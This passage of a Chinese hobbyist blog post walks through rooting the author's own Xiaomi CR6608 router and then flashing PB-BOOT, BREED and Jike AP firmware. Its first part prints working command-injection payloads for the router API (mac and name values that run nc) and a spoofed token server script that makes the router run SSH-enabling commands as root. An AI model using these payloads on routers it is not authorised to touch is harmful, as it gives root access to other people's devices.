class="string">&quot;wan_block&quot;</span>,</span><br><span class="line">					  <span class="comment">//注入。方式一。路由器会执行nc 192.168.31.161 4242</span></span><br><span class="line">                        <span class="attr">&quot;mac&quot;</span>:<span class="string">&quot;;nc 192.168.31.161 4242;#&quot;</span></span><br><span class="line">                    &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        ],</span><br><span class="line">    <span class="attr">&quot;launch&quot;</span>:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;timer&quot;</span>:</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">&quot;time&quot;</span>:<span class="string">&quot;2:2&quot;</span>,</span><br><span class="line">                    <span class="attr">&quot;repeat&quot;</span>:<span class="string">&quot;0&quot;</span>,</span><br><span class="line">                    <span class="attr">&quot;enabled&quot;</span>:<span class="literal">true</span></span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上面json中的<code>mac</code>值就是注入的地方，有多种方式可以注入，路由器会以root执行注入的命令</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="comment">//方式一。路由器会执行nc 192.168.31.161 4242</span></span><br><span class="line"><span class="string">&quot;mac&quot;</span>:<span class="string">&quot;;nc 192.168.31.161 4242;#&quot;</span></span><br><span class="line"><span class="comment">//方式二。利用栈缓冲区溢出，此种方式不合适命令注入）</span></span><br><span class="line"><span class="string">&quot;mac&quot;</span>:<span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%de%ad%be%ef&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>除<code>mac</code>值之外，<code>name</code>值也能注入</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="comment">//方式三。路由器会执行nc 192.168.31.161 4242</span></span><br><span class="line"><span class="string">&quot;name&quot;</span>:<span class="string">&quot;&#x27;$(nc 192.168.31.98 4242)&#x27;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>向路由器这个api发送带着上文<code>payload</code>的POST请求之后，我们再向这个api发送另一个POST请求带着下面的<code>payload</code>即可触发命令的执行：</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;command&quot;</span>:<span class="string">&quot;scene_start_by_crontab&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;time&quot;</span>:<span class="string">&quot;2:2&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;week&quot;</span>:<span class="number">0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以使用任何工具发起POST请求带上字段为<code>payload</code>的参数即可，切记每一次发送了带注入命令的<code>payload</code>之后，需要接着发送上文中第二个<code>payload</code>才能触发命令的执行。</p>
+<p>关于有关启用sshd的命令，路由器的sshd服务端为dropbear，需要执行的命令为：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sed -i s/release/XXXXXX/g /etc/init.d/dropbear</span><br><span class="line">nvram <span class="built_in">set</span> ssh_en=1</span><br><span class="line">nvram commit</span><br><span class="line">/etc/init.d/dropbear <span class="built_in">enable</span></span><br><span class="line">/etc/init.d/dropbear restart</span><br></pre></td></tr></table></figure>
+
+<p>以下是有关此漏洞开启sshd的现成命令与工具：</p>
+<p><a href="https://github.com/mphin/miwifi_tools?tab=readme-ov-file">mphin/miwifi_tools</a>使用curl发送请求，只需要替换掉README中的每一条curl命令中的路由器IP和stok值，一条条按顺序执行即可。需要强调的是powershell中的curl命令实际上为Invoke-WebRequest的别名，如需在powershell中使用真正的curl需要调用curl.exe而不是curl；开启sshd后，root账户的密码可以先试试管理页的登录密码，如果不对需要计算得到<a href="https://miwifi.dev/ssh">Xiaomi Router Developer Guide &amp; Tools</a>。</p>
+<p><a href="https://www.right.com.cn/forum/thread-8348455-1-1.html">【教程】小米 AX3000/AX3600/AX9000/万兆路由器/AC2100/AC2350/AX1800/AX5400 开启SSH-小米无线路由器及小米网络设备-恩山无线论坛</a>详细地写了使用curl开启sshd的教程；</p>
+<p>最后，项目<a href="https://github.com/openwrt-xiaomi/xmir-patcher">openwrt-xiaomi/xmir-patcher</a>包含了开启sshd的功能，也有刷bl等其他功能但我没有在路由器上尝试。这个项目在使用上简单友好，有菜单，有交互输入，clone下来运行并按菜单指示操作就可以了。注意，根据交互输出的提示，此项目已经把root账户密码重置为了root。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/openwrt-xiaomi/xmir-patcher.git</span><br><span class="line">cd xmir-patcher</span><br><span class="line"><span class="meta">#</span><span class="bash">windows下执行!START.bat</span> </span><br><span class="line">.\!START.bat</span><br><span class="line"><span class="meta">#</span><span class="bash">linux下执行run.sh 需要python 3.8+和openssl</span></span><br><span class="line">./run.sh</span><br></pre></td></tr></table></figure>
+
+<p>环境没有安装git可以直接下载项目解压执行。</p>
+<h4 id="1-2：利用小米换机漏洞"><a href="#1-2：利用小米换机漏洞" class="headerlink" title="1.2：利用小米换机漏洞"></a>1.2：利用小米换机漏洞</h4><p>利用这个漏洞的方法是让路由器连上一个wifi，此wifi必须满足在子网内没有DHCP服务，同时在子网内存在IP为169.254.31.1的主机，CR6608可以ping通此主机。</p>
+<p>原理是当路由器没有被DHCP分配IP时会把自己的IP设为169.254.31.2，此时任意一台电脑向路由器请求<code>/api/xqsystem/oneclick_get_remote_token</code>会使路由器向169.254.31.1请求<code>/api/xqsystem/token</code>，路由器收到169.254.31.1的响应后，会执行包含在响应中名为<code>token</code>字段的值里面的任何命令，所以只要把开启sshd的命令写在这个值内，路由器即可开启sshd。</p>
+<p>利用小米换机漏洞的步骤比较繁杂，暂时没有找到一键式的工具，各个帖子利用此漏洞所采取的操作也八仙过海，从效率和使用的角度来看，应该尽量利用smartcontroller漏洞来开启sshd。</p>
+<p>准备：</p>
+<ul>
+<li>两台电脑，其中一台电脑可以安装虚拟机，有无线网卡能开启移动热点，定义为电脑A，另外一台定义为电脑B。</li>
+<li>路由器关闭双频合一，2.4G的WIFI开启。</li>
+</ul>
+<h6 id="1-2-1：电脑A安装VirtualBox"><a href="#1-2-1：电脑A安装VirtualBox" class="headerlink" title="1.2.1：电脑A安装VirtualBox"></a>1.2.1：电脑A安装VirtualBox</h6><p>windows系统有winget可直接在终端使用winget安装，过程不短，中途有可能会多次断网和黑屏，需要耐心等待，安装完最好重启电脑A。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">winget install --id Oracle.VirtualBox</span><br></pre></td></tr></table></figure>
+
+<p>没有winget或者其他系统可用其他包管理器安装或者直接在官网<a href="https://www.virtualbox.org/wiki/Downloads">Downloads – Oracle VirtualBox</a>下载安装。</p>
+<p>也可以用其他虚拟机软件，如VM等。</p>
+<h6 id="1-2-2：下载OpenWrt固件，将img格式的固件转换为VirtualBox的vdi格式文件，在VirtualBox中安装新建虚拟机"><a href="#1-2-2：下载OpenWrt固件，将img格式的固件转换为VirtualBox的vdi格式文件，在VirtualBox中安装新建虚拟机" class="headerlink" title="1.2.2：下载OpenWrt固件，将img格式的固件转换为VirtualBox的vdi格式文件，在VirtualBox中安装新建虚拟机"></a>1.2.2：下载OpenWrt固件，将img格式的固件转换为VirtualBox的vdi格式文件，在VirtualBox中安装新建虚拟机</h6><p>从<a href="https://firmware-selector.openwrt.org/">官网</a>下载合适的固件，此处用的固件是<a href="https://downloads.openwrt.org/releases/22.03.5/targets/x86/64/openwrt-22.03.5-x86-64-generic-ext4-combined-efi.img.gz">openwrt-22.03.5-x86-64-generic-ext4-combined-efi.img</a>。<code>cd</code>到VirtualBox根目录中，使用根目录下的vboxmanage转换固件的文件格式：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">.\vboxmanage.exe convertfromraw &quot;输入的img文件路径&quot; &quot;输出的vdi文件路径&quot; -format VDI</span><br></pre></td></tr></table></figure>
+
+<p>得到vdi格式的文件后，打开VirtualBox新建虚拟机，将vdi文件作为此虚拟机的虚拟硬盘。</p>
+<blockquote>
+<p>踩坑：</p>
+<p>一开始选择了24版本的OpenWrt，安装后发现目录有些变化，找不到LuCI的controller，为了节省时间直接使用电脑里很久之前下载好的22版本。</p>
+<p>官网下载的文件格式是gz，我在windows上用7z解压报错，找不到原因后无奈移动它到debian上用<code>gzip -d xxxx.gz</code>解压。</p>
+<p>新建虚拟机完成后无法启动虚拟机，报错<code>error in supR3HardenedWinReSpawn</code>，原因是服务没有安装成功，需要右键菜单安装VirtualBox根目录下的<code>.\drivers\vboxsup\VBoxSup.inf</code>再重启电脑A。</p>
+</blockquote>
+<h6 id="1-2-3：启动OpenWrt虚拟机，新建lua脚本，关闭LAN接口的DHCP，修改LAN接口的IP地址为169-254-31-1，掩码为255-255-255-0"><a href="#1-2-3：启动OpenWrt虚拟机，新建lua脚本，关闭LAN接口的DHCP，修改LAN接口的IP地址为169-254-31-1，掩码为255-255-255-0" class="headerlink" title="1.2.3：启动OpenWrt虚拟机，新建lua脚本，关闭LAN接口的DHCP，修改LAN接口的IP地址为169.254.31.1，掩码为255.255.255.0"></a>1.2.3：启动OpenWrt虚拟机，新建lua脚本，关闭LAN接口的DHCP，修改LAN接口的IP地址为169.254.31.1，掩码为255.255.255.0</h6><p>为了方便修改OpenWrt的配置，暂时先从VirtualBox的控制台使用终端修改OpenWrt的LAN口IP为与当前电脑网络相同网段，这里电脑A是192.168.2.135/24，所以可以把OpenWrt的LAN口IP暂时先设置为这个网段下没有其他设备使用的IP如192.168.2.136。具体操作：双击虚拟机启动后弹出VirtualBox的控制台，在控制台编辑文件：<code>vim /etc/config/network</code>，修改<code>interface lan</code>下面的<code>option ipaddr</code>处的IP。修改完成重启网卡：<code>/etc/init.d/network restart</code>或重启系统：<code>reboot</code>。同时在VirtualBox处将OpenWrt虚拟机的网络改为桥接，桥接对象为电脑A当前正在上网的网卡，此时电脑A就能连接上虚拟机了，试试<code>ping 192.168.2.136</code>是否ping通。从windows终端处ssh连接它和使用浏览器登录webui都能更方便管理和修改配置。（这一步其实是完全多余的，当然也可以不做，下文操作以任意方式连上OpenWrt都可以完成）</p>
+<p>在电脑A上使用终端ssh进OpenWrt，在<code>/usr/lib/lua/luci/controller/admin/</code>下新建一个名为<code>xqsystem.lua</code>的脚本，内容如下：</p>
+<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span>(<span class="string">&quot;luci.controller.admin.xqsystem&quot;</span>, <span class="built_in">package</span>.<span class="built_in">seeall</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line">    <span class="keyword">local</span> page   = node(<span class="string">&quot;api&quot;</span>)</span><br><span class="line">    page.target  = firstchild()</span><br><span class="line">    page.title   = (<span class="string">&quot;&quot;</span>)</span><br><span class="line">    page.order   = <span class="number">100</span></span><br><span class="line">    page.index = <span class="literal">true</span></span><br><span class="line">    page   = node(<span class="string">&quot;api&quot;</span>,<span class="string">&quot;xqsystem&quot;</span>)</span><br><span class="line">    page.target  = firstchild()</span><br><span class="line">    page.title   = (<span class="string">&quot;&quot;</span>)</span><br><span class="line">    page.order   = <span class="number">100</span></span><br><span class="line">    page.index = <span class="literal">true</span></span><br><span class="line">    entry(&#123;<span class="string">&quot;api&quot;</span>, <span class="string">&quot;xqsystem&quot;</span>, <span class="string">&quot;token&quot;</span>&#125;, call(<span class="string">&quot;getToken&quot;</span>), (<span class="string">&quot;&quot;</span>), <span class="number">103</span>, <span class="number">0x08</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> LuciHttp = <span class="built_in">require</span>(<span class="string">&quot;luci.http&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getToken</span><span class="params">()</span></span></span><br><span class="line">    <span class="keyword">local</span> result = &#123;&#125;</span><br><span class="line">    result[<span class="string">&quot;code&quot;</span>] = <span class="number">0</span></span><br><span class="line">    result[<span class="string">&quot;token&quot;</span>] = <span class="string">&quot;; nvram set ssh_en=1; nvram commit; sed -i &#x27;s/channel=.*/channel=\&quot;debug\&quot;/g&#x27; /etc/init.d/dropbear; /etc/init.d/dropbear start;&quot;</span></span><br><span class="line">    LuciHttp.write_json(result)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+
+<p>浏览器访问192.168.2.135进入OpenWrt的webui，默认密码为空。点击“Network”-“Interface”-Edit”修改lan接口，在“General Settings”下修改ipv4地址为169.254.31.1,子网掩码为255.255.255.0，在“DHCP Server”选项卡下，勾选“General Setup”下的“Ignore interface”，取消勾选“Advanced Settings”下的“Dynamic DHCP”。点击“Save”保存，点击“Save &amp; Apply”应用。修改完这些配置之后，电脑A是连不上OpenWrt的，为了不出现莫名其妙的问题，此时可以在VirtualBox重启一下OpenWrt。</p>
+<blockquote>
+<p>踩坑：</p>
+<p>单单通过勾选“Ignore interface”来禁用DHCP无法应用配置，再加上取消勾选“Dynamic DHCP”就可以了。</p>
+</blockquote>
+<h6 id="1-2-4：开启电脑A的移动热点，将OpenWrt虚拟机的网络桥接到热点的虚拟网卡上，通过取消热点虚拟网卡的IP协议来完全禁用DHCP"><a href="#1-2-4：开启电脑A的移动热点，将OpenWrt虚拟机的网络桥接到热点的虚拟网卡上，通过取消热点虚拟网卡的IP协议来完全禁用DHCP" class="headerlink" title="1.2.4：开启电脑A的移动热点，将OpenWrt虚拟机的网络桥接到热点的虚拟网卡上，通过取消热点虚拟网卡的IP协议来完全禁用DHCP"></a>1.2.4：开启电脑A的移动热点，将OpenWrt虚拟机的网络桥接到热点的虚拟网卡上，通过取消热点虚拟网卡的IP协议来完全禁用DHCP</h6><p>windows需要连接任意的WIFI才能打开移动热点，连接任意WIFI打开移动热点后，在设置中修改好热点的SSID和密码，“共享我的Internet连接”选WLAN，关闭“节能”选项避免操作过程中热点自动关闭。在控制面板中的“网络和Internet”中的“网络连接”，对热点的虚拟网卡右键属性，取消勾选“Internet协议版本4”和“Internet协议版本6”，点击层层确定按钮以完全关闭这些设置窗口以避免设置不生效。最后再到VirtualBox将OpenWrt的网络桥接对象改为此热点的虚拟网卡。至此，任何连上电脑A热点的设备都能连上OpenWrt虚拟机。</p>
+<blockquote>
+<p>踩坑：</p>
+<p>最开始我选择开启CR6608的SSH方案是在电脑A起一个Nginx而不是虚拟机，但是我发现将热点的IP设置为169.254.31.1并取消无线网卡的共享以达到禁用DHCP的目的的时候，CR6608连接电脑A热点总是不成功，虽然最初的十几秒WIFI已经连上，在OpenWrt也是可以ping通169.254.31.2的，但是WIFI最终会断掉，断掉后在电脑B的浏览器返回“DHCP failed code 1619”。其次我尝试过不使用热点而是第三方旧路由器方案，依然会报这个错，也许跟我电脑A的网络拓扑和DHCP没有成功禁用有关系。</p>
+</blockquote>
+<h6 id="1-2-5：电脑B连接路由器，进入路由器的web管理界面，复制浏览器地址栏URL参数中的stok值备用"><a href="#1-2-5：电脑B连接路由器，进入路由器的web管理界面，复制浏览器地址栏URL参数中的stok值备用" class="headerlink" title="1.2.5：电脑B连接路由器，进入路由器的web管理界面，复制浏览器地址栏URL参数中的stok值备用"></a>1.2.5：电脑B连接路由器，进入路由器的web管理界面，复制浏览器地址栏URL参数中的stok值备用</h6><p>路由器通电，电脑B网线连接路由器的LAN口，电脑B的网卡IP地址设置为与路由器LAN口IP同一网段，这里设置为192.168.10.34。若电脑B用无线连接路由器，则要确保路由器的双频没有合一，并且只连接其5G的WIFI，因为2.4G在后续需要连接电脑A的热点，同时也要记得修改无线网卡的IP。浏览器输入路由器的IP地址即192.168.10.1，进入管理界面后复制浏览器地址栏URL参数中的stok值备用。注意！电脑B中的管理界面不能关掉，浏览器不能关掉，不能断开与路由器的连接，以此来保证stok值不发生变化。</p>
+<blockquote>
+<p>CR6606/CR6608/CR6609默认IP分别为：192.168.31.1、192.168.10.1、192.168.2.1</p>
+</blockquote>
+<h6 id="1-2-6：在电脑B浏览器访问路由器的api：-api-misystem-extendwifi-connect，使路由器去连接电脑A的热点"><a href="#1-2-6：在电脑B浏览器访问路由器的api：-api-misystem-extendwifi-connect，使路由器去连接电脑A的热点" class="headerlink" title="1.2.6：在电脑B浏览器访问路由器的api：/api/misystem/extendwifi_connect，使路由器去连接电脑A的热点"></a>1.2.6：在电脑B浏览器访问路由器的api：<code>/api/misystem/extendwifi_connect</code>，使路由器去连接电脑A的热点</h6><p>在电脑B开启一个新的浏览器标签页或窗口，访问以下替换掉“路由器IP”、“stok值”、“热点名称”、“热点密码”的链接：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://路由器IP/cgi-bin/luci/;stok=stok值/api/misystem/extendwifi_connect?ssid=热点名称&amp;password=热点密码</span><br></pre></td></tr></table></figure>
+
+<p>稍加等待，成功会返回一个code为0的json值<code>&#123;&quot;msg&quot;:&quot;connect succces!&quot;,&quot;code&quot;:0&#125;</code>。题外话，貌似开发人员在这里有拼写错误，我的路由器的确返回的是“succces”。</p>
+<blockquote>
+<p>踩坑：</p>
+<p>坑太多了，这里成功需要完全保证169.254.31.1的设备或者这个子网内不小心连上的其它设备都关闭DHCP，以确保CR6608在没有被分配IP的情况下将自己IP设置为169.254.31.2——所以为避免冲突整个子网也不能有IP为169.254.31.2的占用。我尝试的其他方案大多数都在这一步报了1619的错，唯一有一次在第三方旧路由方案中，我尝试各种接法中的一种，成功返回了code0，但是我已经忘记了它是怎么接的了，而且跟连上电脑A热点的DHCP是否是真的关掉了有非常大的关系。像上文提到的，CR6608并不是连不上热点，而是连上了热点不久又自己断掉才返回的1619报错。</p>
+</blockquote>
+<h6 id="1-2-7：在电脑B浏览器访问api：-api-xqsystem-oneclick-get-remote-token使路由器触发小米换机的漏洞，以此来开启SSHD"><a href="#1-2-7：在电脑B浏览器访问api：-api-xqsystem-oneclick-get-remote-token使路由器触发小米换机的漏洞，以此来开启SSHD" class="headerlink" title="1.2.7：在电脑B浏览器访问api：/api/xqsystem/oneclick_get_remote_token使路由器触发小米换机的漏洞，以此来开启SSHD"></a>1.2.7：在电脑B浏览器访问api：<code>/api/xqsystem/oneclick_get_remote_token</code>使路由器触发小米换机的漏洞，以此来开启SSHD</h6><p>在电脑B开启一个新的浏览器标签页或窗口，访问以下替换掉“路由器IP”、“stok值”的链接：（链接中的username以及其他参数的值都不要改，它就是xxx）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://路由器IP/cgi-bin/luci/;stok=stok值/api/xqsystem/oneclick_get_remote_token?username=xxx&amp;password=xxx&amp;nonce=xxx</span><br></pre></td></tr></table></figure>
+
+<p>稍加等待，成功一样会返回一个code为0的json值<code>&#123;&quot;token&quot;:&quot;..........&quot;,&quot;code&quot;:0&#125;</code>。至此，路由器的sshd已经成功开启，不要断掉连接也不要重启路由器，因为sshd没有固化。</p>
+<h2 id="2：刷PB-BOOT"><a href="#2：刷PB-BOOT" class="headerlink" title="2：刷PB-BOOT"></a>2：刷PB-BOOT</h2><h6 id="2-1：在电脑B上使用scp或者winscp等工具传PB-BOOT的img文件进路由器，在电脑B的终端上使用SSH登录路由器，刷入PB-BOOT"><a href="#2-1：在电脑B上使用scp或者winscp等工具传PB-BOOT的img文件进路由器，在电脑B的终端上使用SSH登录路由器，刷入PB-BOOT" class="headerlink" title="2.1：在电脑B上使用scp或者winscp等工具传PB-BOOT的img文件进路由器，在电脑B的终端上使用SSH登录路由器，刷入PB-BOOT"></a>2.1：在电脑B上使用scp或者winscp等工具传PB-BOOT的img文件进路由器，在电脑B的终端上使用SSH登录路由器，刷入PB-BOOT</h6><p>在电脑B上打开winscp，协议选择scp，IP地址填写路由器的地址即192.168.10.1，用户名是root，密码是机器背部贴纸的密码也就是管理页面的管理员密码。</p>
+<p>winscp进入路由器后，将提前准备好的PB-BOOT的img文件传送进路由器内，一般选择<code>/tmp</code>目录。</p>
+<p>接着，在终端上使用ssh进入路由器：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh -oHostKeyAlgorithms=+ssh-rsa root@192.168.10.1</span><br></pre></td></tr></table></figure>
+
+<p>成功进去之后，刷PB-BOOT：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mtd write /tmp/pb-boot.img Bootloader</span><br></pre></td></tr></table></figure>
+
+<p>运行完之后重启：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">reboot</span><br></pre></td></tr></table></figure>
+
+<p>至此，PB-BOOT刷完，重启机器稍微等待一会，拔掉路由器的电源，用取卡针或者牙签顶住路由器的reset按钮不松开，再接上路由器的电源，等待十几秒后松开reset按钮，此时路由器开机进入PB-BOOT。把电脑B的网卡改成192.168.1.0/24网段的，例如192.168.1.34，子网掩码改为255.255.255.0，就可以在电脑B上通过浏览器里访问192.168.1.1进入PB-BOOT。</p>
+<blockquote>
+<p>踩坑：</p>
+<p>winscp中协议不选scp会被目标拒绝。</p>
+<p>其他帖子提到CR6606在刷机之后root密码会变成与MAC/SN相关的密码需要计算才能得到。</p>
+<p>ssh不加rsa的参数去连接路由器如果报<code>no matching host key type found.Their offer:ssh-rsa</code>的错，需要加上<code>-oHostKeyAlgorithms=+ssh-rsa</code>参数，变成<code>ssh -oHostKeyAlgorithms=+ssh-rsa root@192.168.10.1</code></p>
+</blockquote>
+<h2 id="3：刷BREED改MAC（可选）"><a href="#3：刷BREED改MAC（可选）" class="headerlink" title="3：刷BREED改MAC（可选）"></a>3：刷BREED改MAC（可选）</h2><h6 id="3-1：刷集客固件之后每次重启MAC都会改变，如果最终目的是刷集客固件的话，需要事先刷BREED去固定MAC再刷会PB-BOOT。如果是刷OpenWrt或者其他固件，此步跳过。"><a href="#3-1：刷集客固件之后每次重启MAC都会改变，如果最终目的是刷集客固件的话，需要事先刷BREED去固定MAC再刷会PB-BOOT。如果是刷OpenWrt或者其他固件，此步跳过。" class="headerlink" title="3.1：刷集客固件之后每次重启MAC都会改变，如果最终目的是刷集客固件的话，需要事先刷BREED去固定MAC再刷会PB-BOOT。如果是刷OpenWrt或者其他固件，此步跳过。"></a>3.1：刷集客固件之后每次重启MAC都会改变，如果最终目的是刷集客固件的话，需要事先刷BREED去固定MAC再刷会PB-BOOT。如果是刷OpenWrt或者其他固件，此步跳过。</h6><p>紧接上文第2节，在PB-BOOT的页面上点击选择文件，选择电脑B上实现准备好的BREED的bin文件，点击恢复固件，耐心等待它刷完，点击“进入路由器首页”可以直接进BREED，BREED的IP也是192.168.1.1。点击MAC地址修改，在“LAN MAC”那一行填上机器背部贴纸上的MAC地址，点击“修改”。点击固件更新，勾选“Bootloader”，选择PB-BOOT固件，勾选“自动重启”，点击“上传”，点击“更新”，耐心等待它刷回PB-BOOT。提示成功刷完后，浏览器重新访问192.168.1.1就可以回到PB-BOOT了。</p>
+<blockquote>
+<p>踩坑：</p>
+<p>直接用BREED刷集客AP固件，在一些版本上会出现路由器指示灯不亮的问题，这对于CR6608影响非常大，因为它后面的接口也没有指示灯，如果正面的指示灯不亮的话，根本无法判断它是否正常开机。</p>
+</blockquote>
+<h2 id="4：刷集客AP固件"><a href="#4：刷集客AP固件" class="headerlink" title="4：刷集客AP固件"></a>4：刷集客AP固件</h2><h6 id="4-1：在PB-BOOT上选择8-0版本的集客固件刷入"><a href="#4-1：在PB-BOOT上选择8-0版本的集客固件刷入" class="headerlink" title="4.1：在PB-BOOT上选择8.0版本的集客固件刷入"></a>4.1：在PB-BOOT上选择8.0版本的集客固件刷入</h6><p>在PB-BOOT上选择电脑B上提前准备好的集客固件，固件的型号是AP246ND，版本是8.0，刷入。至此，路由器刷集客AP固件完成。</p>
+<h6 id="4-2：进入集客AP管理页面"><a href="#4-2：进入集客AP管理页面" class="headerlink" title="4.2：进入集客AP管理页面"></a>4.2：进入集客AP管理页面</h6><p>刷完后，集客AP的默认IP地址为6.6.6.6，像上文一样再次修改电脑B网卡的IP地址为6.6.6.6/24网段的IP例如6.6.6.34，就可以进入集客AP的管理页面。</p>
+<blockquote>
+<p>踩坑：</p>
+<p>6.1版本的AP246ND固件的管理页面，用Edge浏览器无法登录，在输入密码后进入页面会闪一下便立刻退出，换Chrome没有发现此问题，疑似跟浏览器的插件有冲突。另外7.4版本的AP246ND固件在Edge上打开管理页面一切正常。</p>
+<p>从<a href="https://www.right.com.cn/forum/thread-8089957-1-1.html">小米CR660X（6606/6608/6609) 折腾过程以及刷集客AP测试发现的几个问题-小米无线路由器及小米网络设备-恩山无线论坛</a>看来，有着先刷6.1再更新7.4的操作，原因为：低版本存在射频无信号的BUG，高版本存在开机几分钟便无限重启的BUG，先刷6.1再升7.4可以同时避免这两个BUG。</p>
+<p>7.4版本的5G信号启动得非常慢，起初我误以为此版本在路由器上没有5G射频，事实上开机好几分钟之后才能在列表看到5G的SSID。重新刷了7.2版本，此问题同样存在。</p>
+<p>目前尝试过的版本：6.4、7.2、7.4、8.0都会在重启后丢失所有配置，所以从实际情况考虑是需要部署一个AC用于下发配置的。</p>
+<p>最终选择的8.0集客AP固件是没有free版本的，所以8.0的管理页面会显示未注册——即使刚刷完显示已注册但用一会就会变回未注册。就目前看来，未注册暂时没有对我造成使用上的困扰。</p>
+</blockquote>
+<h2 id="5：部署集客AC"><a href="#5：部署集客AC" class="headerlink" title="5：部署集客AC"></a>5：部署集客AC</h2><p>集客官方直接提供了AC控制器在各平台的二进制文件：<a href="http://file.cnrouter.com/index.php/Index/gac.html">文件管理</a>，加上我的主路由环境多年来一直都是ESXi打底上面跑OpenWrt的组合，使得安装软AC的过程畅通无阻。如果主路由没有虚拟化的话，软AC需要考虑其他方案，比如在OpenWrt上跑Docker部署软AC的镜像，或者不考虑软AC，改之为使用一台合适的路由器刷集客对应版本的AC固件。</p>
+<h6 id="5-1：ESXi创建虚拟机"><a href="#5-1：ESXi创建虚拟机" class="headerlink" title="5.1：ESXi创建虚拟机"></a>5.1：ESXi创建虚拟机</h6><p>集客官方在<a href="http://file.cnrouter.com/index.php/Index/gac.html">文件管理</a>提供了86、amd64、arm、mips各个平台的文件，选择最熟悉的系统即可。这里安装的是我比较熟悉的Debian，从Debian官网提供的镜像站下载Debian的iso文件<a href="https://mirrors.163.com/debian-cd/12.10.0/amd64/iso-dvd/debian-12.10.0-amd64-DVD-1.iso">debian-12.1.0-amd64-DVD-1.iso</a>。</p>
+<p>在ESXi上创建一台虚拟机，在设置上，网络适配器：选择的端口组为主路由所在的端口组，或不同端口组但两端口组处于同一个虚拟交换机内，这里显而易见是为了让Debian与主路由所处的网络连通。CD/DVD硬盘驱动器：选择Debian的iso镜像。</p>
+<p>启动Debian虚拟机开始安装系统，安装过程中的不要选择任何多余的软件，只需要选择安装SSH就可以了。</p>
+<h6 id="5-2：虚拟机的基本网络配置"><a href="#5-2：虚拟机的基本网络配置" class="headerlink" title="5.2：虚拟机的基本网络配置"></a>5.2：虚拟机的基本网络配置</h6><p>根据集客官方的说明文档：<a href="http://file.cnrouter.com/upload/gac/%E5%90%AB%E7%99%BB%E5%BD%95%E9%A1%B5%E9%9D%A2%E7%89%88%E6%9C%AC%EF%BC%88%E4%B8%BB%E8%A6%81%E7%94%A8%E4%BA%8E%E7%8B%AC%E7%AB%8B%E4%BD%BF%E7%94%A8%EF%BC%89/%E8%BF%90%E8%A1%8C%E5%8F%82%E6%95%B0%E8%AF%B4%E6%98%8E.txt">file.cnrouter.com/upload/gac/含登录页面版本（主要用于独立使用）/运行参数说明.txt</a>，需要让AP能访问到6.7.8.9:60650，可选方案一是把Debian的IP静态为6.7.8.9，二是从OpenWrt主路由做一个转发从Debian的IP:端口转发到6.7.8.9:60650。为了考虑方便迁移，减少依赖性，此处选择的前者，直接把Debian静态为6.7.8.9。</p>
+<p>修改<code> /etc/network/interfaces</code>，把Debian当前的网卡ens33设为静态，网关指向OpenWrt主路由。</p>
+<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment">#ipv4 static                                                                     auto ens33                                                                       iface ens33 inet static                                                           address 6.7.8.9                                                                   netmask 255.255.255.0                                                             gateway 192.168.2.1</span></span><br></pre></td></tr></table></figure>
+
+<p>重启网卡</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl restart networking</span><br></pre></td></tr></table></figure>
+
+<h6 id="5-3-部署集客软AC"><a href="#5-3-部署集客软AC" class="headerlink" title="5.3: 部署集客软AC"></a>5.3: 部署集客软AC</h6><p>下载集客官方提供的文件<a href="http://file.cnrouter.com/upload/gac/%E5%90%AB%E7%99%BB%E5%BD%95%E9%A1%B5%E9%9D%A2%E7%89%88%E6%9C%AC%EF%BC%88%E4%B8%BB%E8%A6%81%E7%94%A8%E4%BA%8E%E7%8B%AC%E7%AB%8B%E4%BD%BF%E7%94%A8%EF%BC%89/ac_linux_amd64_V2.2_202503181710">ac_linux_amd64_V2.2_202503181710</a>到Debian</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc</span><br><span class="line">mkdir jike</span><br><span class="line"><span class="built_in">cd</span> ./jike</span><br><span class="line">wget http://file.cnrouter.com/upload/gac/%E5%90%AB%E7%99%BB%E5%BD%95%E9%A1%B5%E9%9D%A2%E7%89%88%E6%9C%AC%EF%BC%88%E4%B8%BB%E8%A6%81%E7%94%A8%E4%BA%8E%E7%8B%AC%E7%AB%8B%E4%BD%BF%E7%94%A8%EF%BC%89/ac_linux_amd64_V2.2_202503181710</span><br><span class="line">chmod +x ac_linux_amd64_V2.2_202503181710</span><br></pre></td></tr></table></figure>
+
